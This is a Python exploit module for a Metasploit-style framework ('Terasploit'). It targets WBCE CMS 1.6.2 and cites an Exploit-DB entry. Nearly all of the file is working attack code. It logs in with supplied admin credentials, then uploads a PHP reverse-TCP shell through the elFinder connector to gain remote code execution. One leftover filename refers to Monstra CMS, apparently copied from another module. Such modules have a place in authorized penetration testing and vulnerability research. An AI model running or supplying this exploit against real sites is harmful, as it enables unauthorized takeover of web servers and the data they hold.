#######
# Module/Exploit: WBCE CMS Authenticated Remote Code Execution
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitExploit(Exploit):
    
    module_type = 'exploit'
    payload = 'modules/payload/php/multi/reverse_tcp'
    encoder = None
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : 'exploit',
                'Name' : 'WBCE CMS Authenticated Remote Code Execution',
                'Module Author' : 'Charlie (4steroth)',
                'Exploit Author' : 'Ahmet Ãœmit BAYRAM',
                'Version' : '1.6.2',
                'Exploit-DB' : 'https://www.exploit-db.com/exploits/52039',
                
                'Description' : [
                    'A remote code execution (RCE) vulnerability in WBCE CMS version 1.6.2',
                    'allowing attackers to upload a shell on the target.',
                ]
            }
        )

        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptPort.new('rport',opt=[80,'yes','target port (tcp)']),
            OptString.new('username','none',['','yes','username to use for authentication']),
            OptString.new('password','none',['','yes','password to use for authentication'])
        ])


    def exploit(self):
        try:
            target = self.GetOPT('target')
            username = self.GetOPT('username')
            password = self.GetOPT('password')
            rport = self.GetOPT('rport')
            shell = self.EncodeShell(self.encoder,self.payload.shell_content())
            
            scheme, host = self.ParseTarget(target,return_list=['scheme','hostname'])

            info_print ('Logging in...')
            
            url = f"{scheme}://{host}:{rport}"
            shell_url = url + '/media/shell.inc'
            Shell(shell_url).new()
            
            admin_login = HTTP.session.get(url + '/admin/login/index.php')
            web_scrape = BeautifulSoup(admin_login.text,'html.parser')
            
            form = web_scrape.find('form', attrs={'name':'login'})
            form_data = {input_tag['name']: input_tag.get('value','') for input_tag in form.findall('input') if input_tag.get('type') != 'submit'}
            
            form_data[web_scrape.find('input', {'name': 'username_fieldname'})['value']] = username
            form_data[web_scrape.find('input', {'name': 'password_fieldname'})['value']] = password

            login_response = HTTP.session.post(url + '/admin/login/index.php', data=form_data)
            if 'Administration' in login_response.text:
                info_print('Logged in.',type='green')
            else:
                info_print ('Failed to login.',type='red')
                info_print ('Saving received headers & response text into text file.')
                with open(f'monstra_cms_headers&response.txt','w') as text_file:
                    text_file.write(
                        f'[*] HEADERS RECEIVED \n{login_response.headers}\n' + 
                        f'[*] RESPONSE TEXT \n{login_response.text[:500]}\n'
                    )
                    HTTP().new()
                return 'session', False

            file = {'upload[]':('shell.inc',shell,'application/octet-stream')}
            data = {'reqid':'18f3a5c13d42c5','cmd':'upload','target':'l1_Lw','mtime[]':'1714669495'}

            exploit = HTTP.session.post(url + '/modules/elfinder/ef/php/connector.wbce.php', files=file, data=data)
            if exploit.status_code in self.good_status_code():
                info_print (f'Status code: {exploit.status_code}',type='green')
                info_print (f'Shell uploaded: {shell_url}')
                HTTP().new()
                return 'session', True
            else:
                info_print ('Exploit failed.',type='red')
                info_print (f'Status code: {exploit.status_code}')
                HTTP().new()
                return 'session', False
        
        except Exception as error:
            info_print (error,type='red')
            HTTP().new()
            return 'exception', True